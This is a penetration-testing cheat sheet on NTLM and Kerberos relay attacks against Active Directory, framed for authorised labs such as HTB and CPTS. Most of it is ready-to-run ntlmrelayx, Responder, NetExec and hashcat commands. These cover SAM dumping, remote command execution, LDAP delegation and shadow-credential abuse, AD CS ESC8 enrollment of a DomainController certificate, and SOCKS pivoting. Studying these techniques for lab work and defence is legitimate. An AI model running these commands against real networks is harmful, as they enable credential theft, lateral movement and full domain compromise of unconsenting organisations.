---
title: "NTLM & Kerberos Relay"
description: "Coercion and relay attacks: ntlmrelayx/Responder targets, ADCS/LDAP relay and Kerberos relaying."
category: tools
tags: [relay, ntlm, kerberos, coercion]
tools: [ntlmrelayx, Responder, Coercer]
difficulty: advanced
updated: "2026-08-09"
source: "vault:Tools/NTLM-Kerberos-Relay-Cheatsheet.md"
---

# NTLM & Kerberos Relay

> **Context —** HTB / CPTS / authorised AD labs. Tool: Impacket `ntlmrelayx` plus coercion helpers. Flags verified against `ntlmrelayx.py -h` (Impacket v0.13.x). Always re-check on your build.

Relay playbook for authorised assessments: capture or coerce NTLM authentications, relay to signing-disabled / relay-capable endpoints, optionally escalate via LDAP/AD CS/SOCKS.

Related notes: Impacket, Certipy, NetExec, BloodHound, Hashcat, Rubeus.

---

## Summary

NTLM relay forwards a victim's authentication bytes to a service that accepts them. Classic lab chain: poison or coerce → `ntlmrelayx` listener → dump SAM / LDAP ACL abuse / AD CS enrollment / SOCKS pivot. SMB signing, EPA/channel binding, and Kerberos-only auth are the usual blockers. Use NetExec (`smb --gen-relay-list`) to build target lists.

> **Danger — authorised-use framing**
> 1. Poisoning and coercion are disruptive — stay inside ROE and lab scope.
> 2. Do not run Responder + `ntlmrelayx` SMB servers on the same port without coordination (`--no-smb-server` patterns).
> 3. Document every coerced host and relay target for the report.

---

## When Relay Works

| Condition | Why it matters |
|---|---|
| SMB signing **not required** on target | Unsigned SMB accepts relayed NTLM |
| LDAP/LDAPS signing / channel binding gaps | Enables LDAP relay → ACL / Shadow / DCSync prep |
| HTTP service without proper EPA/CBT | AD CS web enrollment (ESC8), other HTTP NTLM apps |
| Victim authenticates with **NTLM** (not pure Kerberos) | Relay needs NTLM tokens |
| You control listener + have coercion/poison path | No auth → nothing to relay |

```bash
# Build relayable SMB targets (NetExec)
nxc smb 10.10.10.0/24 --gen-relay-list relay.txt
```

---

## ntlmrelayx Quick Flags

| Flag | Purpose |
|---|---|
| `-t` / `--target` | Relay destination (host or URL) |
| `-tf` | Targets file |
| `-smb2support` | SMB2 support (almost always needed) |
| `-socks` | Open SOCKS proxy on successful relays |
| `-c COMMAND` | Execute command on successful SMB relay |
| `-e FILE` | Execute binary/export on success |
| `-l LOOTDIR` | Loot directory |
| `-of OUTPUT_FILE` | Hash / output file prefix |
| `--no-smb-server` | Disable incoming SMB server (use with Responder) |
| `--adcs` | AD CS enrollment attack mode |
| `--template` | Certificate template for AD CS relay |
| `--shadow-credentials` | Shadow creds via LDAP relay |
| `--delegate-access` | Resource-based constrained delegation setup |
| `--remove-mic` | MIC removal tricks (CVE-era / legacy targets) |
| `-i` | Interactive shell on success (SMB) |
| `-ip` | Interface IP for servers |

---

## Core Relay Patterns

```bash
# SMB dump against signing-disabled targets
sudo ntlmrelayx.py -tf relay.txt -smb2support

# Single target + interactive
sudo ntlmrelayx.py -t smb://10.10.10.50 -smb2support -i

# Run a command on success
sudo ntlmrelayx.py -t 10.10.10.50 -smb2support -c 'whoami'

# LDAP relay (ACL / escalation options)
sudo ntlmrelayx.py -t ldap://dc.domain.local -smb2support --delegate-access
```

> **Command breakdown**
> 1. **-tf relay.txt**: only hosts that failed signing checks.
> 2. **-smb2support**: required for modern Windows.
> 3. **-t ldap://…**: protocol URL selects the relay client module.
> 4. Run coercion or Responder in a second terminal after the listener is up.

---

## AD CS / Shadow / SOCKS

```bash
# ESC8 via ntlmrelayx HTTP → cert enrollment
sudo ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp \
  -smb2support --adcs --template DomainController

# Or use Certipy's dedicated relay (see Certipy sheet)
# certipy relay -target http://ca.domain.local/certsrv/certfnsh.asp

# Shadow credentials via LDAP relay
sudo ntlmrelayx.py -t ldap://dc.domain.local -smb2support --shadow-credentials \
  --shadow-target 'targetcomputer$'

# SOCKS pivot after successful relays
sudo ntlmrelayx.py -tf relay.txt -smb2support -socks
# then: proxychains nxc smb ... / Impacket with proxy
```

---

## Coercion Pointers

> **Tip — common coercion families (authorised labs)**
> 1. **MS-RPRN / PrinterBug**, **PetitPotam** (MS-EFSRPC), **DFSCoerce**, **ShadowCoerce** — force a host to authenticate to you.
> 2. Point the coerce **listener** at your `ntlmrelayx` / Certipy relay IP.
> 3. Prefer targeting machines whose auth lands on a useful relay sink (DC LDAP, CA HTTP, admin workstation SMB).
> 4. Exact public PoC flags change — verify the tool `-h` in your kit; do not mix untested coerce + relay ports.

```text
# Conceptual pattern (tool-specific flags omitted on purpose)
# 1) start relay listener
# 2) coerce VICTIM → http://YOUR_IP/ or smb://YOUR_IP/
# 3) collect loot / SOCKS / PFX
```

---

## Kerberos Notes (vs NTLM)

> **Why "Kerberos relay" is a different problem**
> 1. Classic `ntlmrelayx` chains abuse **NTLM**. Kerberos tickets are service-bound (SPN) and do not relay the same way.
> 2. Some modern techniques abuse Kerberos *delegation* / unconstrained / RBCD / s4u — that is ticket abuse (see Rubeus), not NTLM relay.
> 3. If the environment forces Kerberos and disables NTLM, pivot to RBCD, AD CS, or credential theft instead of Responder.
> 4. LLMNR/NBT-NS poisoning often still yields NetNTLMv2 for Hashcat even when SMB relay is blocked by signing.

```bash
# Offline crack path when relay is blocked but capture succeeded
# Responder → Hashcat mode 5600 (NetNTLMv2)
hashcat -m 5600 capture.txt wordlist -r rules/best64.rule
```

---

## Practical Recipes

```bash
# A) Enumerate → relay SMB → SAM
nxc smb 10.10.10.0/24 --gen-relay-list relay.txt
sudo ntlmrelayx.py -tf relay.txt -smb2support -l loot

# B) Coerce DC → AD CS HTTP → DC cert → auth
sudo ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
# coerce dc$ → attacker
# certipy auth -pfx dc.pfx ...

# C) Responder + relay without SMB port clash
sudo responder -I tun0 -dwv   # or disable SMB/HTTP in Responder.conf
sudo ntlmrelayx.py -tf relay.txt -smb2support --no-smb-server
```

---

## Troubleshooting & Gotchas

> **Common failures**
> 1. **Port already in use**: Responder and ntlmrelayx both want 445/80 — use `--no-smb-server` / edit Responder.conf.
> 2. **Signing required**: remove target from `relay.txt`; fall back to hash cracking.
> 3. **Multi-relay exhausted**: try `--keep-relaying` / fresh coerce; some modes one-shot a session.
> 4. **LDAP channel binding**: LDAPS relay options may fail on hardened DCs — check error text.

---

## Lessons Learned

1. Generate relay lists first; blind `-t` against signed SMB wastes coerces.
2. Separate poison, coerce, and relay into clear terminal roles.
3. AD CS relay often beats SMB dumps for domain-class access.
4. SOCKS turns one successful session into a reusable pivot — protect that port.
5. If NTLM is dead, stop forcing relay — switch to Kerberos/AD CS/RBCD tradecraft.

---

## References

1. Impacket ntlmrelayx — https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py
2. NetExec wiki — https://www.netexec.wiki/
3. HackTricks — NTLM relay
4. Microsoft — NTLM overview
5. MITRE ATT&CK — Man-in-the-Middle (T1557)
